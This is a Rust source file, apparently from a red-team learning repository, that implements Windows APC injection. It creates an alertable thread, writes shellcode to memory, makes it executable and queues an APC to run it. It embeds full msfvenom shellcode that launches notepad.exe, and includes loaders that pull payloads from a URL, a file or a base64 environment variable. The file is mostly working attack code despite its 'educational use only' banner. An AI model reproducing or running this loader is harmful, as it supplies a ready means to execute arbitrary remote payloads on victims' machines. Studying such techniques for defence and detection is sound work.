//! # APC Injection Technique
//!
//! This module demonstrates Asynchronous Procedure Call (APC) injection, a technique
//! used to execute shellcode in the context of a thread. This is for educational and
//! authorised security research purposes only.
//!
//! ## Technique Overview
//!
//! APC injection works by:
//! 1. Creating a thread in an alertable wait state
//! 2. Allocating memory for shellcode
//! 3. Queueing an APC to execute the shellcode
//! 4. Resuming the thread to trigger APC execution
//!
//! ## References
//!
//! - https://github.com/joaoviictorti/RustRedOps/blob/main/APC-Injection/Local/src/main.rs
//! - MITRE ATT&CK T1055.004: Process Injection - Asynchronous Procedure Call

use std::ffi::c_void;
use std::ptr::copy_nonoverlapping;
use windows::core::Result;
use windows::Win32::System::Memory::{
    VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
    PAGE_PROTECTION_FLAGS, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateThread, QueueUserAPC, ResumeThread, SleepEx, WaitForSingleObject, INFINITE,
    THREAD_CREATION_FLAGS,
};

/// Loads shellcode from various sources
mod payload_loader {
    use std::fs::File;
    use std::io::Read;
    use std::path::Path;

    /// Load payload from a file
    pub fn from_file<P: AsRef<Path>>(path: P) -> std::io::Result<Vec<u8>> {
        let mut file = File::open(path)?;
        let mut buffer = Vec::new();
        file.read_to_end(&mut buffer)?;
        Ok(buffer)
    }

    /// Load payload from environment variable (base64 encoded)
    #[cfg(feature = "env-loader")]
    pub fn from_env(var_name: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let encoded = std::env::var(var_name)?;
        let decoded = base64::decode(encoded)?;
        Ok(decoded)
    }

    /// Load payload from HTTP/HTTPS endpoint
    #[cfg(feature = "http-loader")]
    pub fn from_url(url: &str) -> Result<Vec<u8>, Box<dyn std::error::Error>> {
        let response = reqwest::blocking::get(url)?;
        let bytes = response.bytes()?;
        Ok(bytes.to_vec())
    }

    /// Embedded payload (compile-time inclusion)
    pub fn from_embedded() -> &'static [u8] {
        include_bytes!("../payload.bin")
    }
}

/// Executes shellcode using APC injection technique
///
/// # Safety
///
/// This function is unsafe because it:
/// - Allocates executable memory
/// - Copies arbitrary shellcode
/// - Executes untrusted code
/// - Uses raw pointers and FFI calls
///
/// # Parameters
///
/// * `shellcode` - The shellcode bytes to execute
///
/// # Returns
///
/// * `Ok(())` on successful execution
/// * `Err(windows::core::Error)` if any Windows API call fails
///
/// # Examples
///
/// ```no_run
/// let shellcode = vec![0x90, 0x90, 0xc3]; // NOP, NOP, RET
/// unsafe {
///     execute_apc_injection(&shellcode).expect("APC injection failed");
/// }
/// ```
unsafe fn execute_apc_injection(shellcode: &[u8]) -> Result<()> {
    println!("[+] Starting APC injection");
    println!("[*] Shellcode size: {} bytes", shellcode.len());

    // Step 1: Create a thread in suspended state with alertable wait function
    println!("[*] Creating target thread...");
    let hthread = CreateThread(
        None,                      // Default security attributes
        0,                         // Default stack size
        Some(alertable_thread_fn), // Thread function
        None,                      // No parameter
        THREAD_CREATION_FLAGS(0),  // Run immediately (not suspended)
        None,                      // Don't need thread ID
    )?;
    println!("[+] Thread created successfully (handle: {:?})", hthread);

    // Step 2: Allocate RW memory for shellcode
    println!("[*] Allocating memory for shellcode...");
    let address = VirtualAlloc(
        None,                     // Let system choose address
        shellcode.len(),          // Size of allocation
        MEM_COMMIT | MEM_RESERVE, // Commit and reserve pages
        PAGE_READWRITE,           // Initially RW for writing
    );

    if address.is_null() {
        return Err(windows::core::Error::from_win32());
    }
    println!("[+] Memory allocated at: {:?}", address);

    // Step 3: Copy shellcode into allocated memory
    println!("[*] Copying shellcode to allocated memory...");
    copy_nonoverlapping(shellcode.as_ptr().cast(), address, shellcode.len());
    println!("[+] Shellcode copied successfully");

    // Step 4: Change memory permissions to RX (Remove Write, Add Execute)
    println!("[*] Changing memory permissions to RX...");
    let mut old_protect = PAGE_PROTECTION_FLAGS(0);
    VirtualProtect(
        address,
        shellcode.len(),
        PAGE_EXECUTE_READ,
        &mut old_protect,
    )?;
    println!("[+] Memory permissions changed to PAGE_EXECUTE_READ");

    // Step 5: Queue APC to execute shellcode
    println!("[*] Queueing APC for execution...");
    QueueUserAPC(
        Some(std::mem::transmute(address)), // Transmute address to APC function pointer
        hthread,                            // Target thread
        0,                                  // No parameter
    );
    println!("[+] APC queued successfully");

    // Step 6: Resume thread (APC will execute when thread enters alertable state)
    println!("[*] Resuming thread...");
    ResumeThread(hthread);
    println!("[+] Thread resumed, waiting for execution...");

    // Step 7: Wait for thread to complete
    WaitForSingleObject(hthread, INFINITE);
    println!("[+] Thread completed execution");

    Ok(())
}

/// Thread function that enters an alertable wait state
///
/// This function is the entry point for the created thread. It immediately
/// enters an alertable wait state using `SleepEx`, which allows queued APCs
/// to execute.
///
/// # Safety
///
/// This is an unsafe extern "system" function required by Windows threading API
unsafe extern "system" fn alertable_thread_fn(_param: *mut c_void) -> u32 {
    // Enter alertable wait state - this allows the queued APC to execute
    // The second parameter (true) makes the wait alertable
    SleepEx(INFINITE, true);
    0 // Return success
}

fn main() -> Result<()> {
    println!("╔════════════════════════════════════════════════════════════╗");
    println!("║          APC Injection Technique Demonstration             ║");
    println!("║              Educational Use Only                          ║");
    println!("╚════════════════════════════════════════════════════════════╝\n");

    // Example shellcode: msfvenom -p windows/x64/exec CMD=notepad.exe -f rust
    // In production, you would load this from a file, environment variable, or other source
    let shellcode: [u8; 279] = [
        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
        0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48,
        0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9,
        0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48,
        0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01,
        0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44, 0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48,
        0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c,
        0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44, 0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0,
        0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04,
        0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41, 0x59, 0x5a, 0x48,
        0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f,
        0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb,
        0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x6e, 0x6f, 0x74,
        0x65, 0x70, 0x61, 0x64, 0x2e, 0x65, 0x78, 0x65, 0x00,
    ];

    // Alternative payload loading methods (commented out):

    // Load from file:
    // let shellcode = payload_loader::from_file("payload.bin")
    //     .expect("Failed to load payload from file");

    // Load from embedded resource:
    // let shellcode = payload_loader::from_embedded();

    // Execute the APC injection
    unsafe {
        execute_apc_injection(&shellcode)?;
    }

    println!("\n[+] APC injection completed successfully");
    Ok(())
}
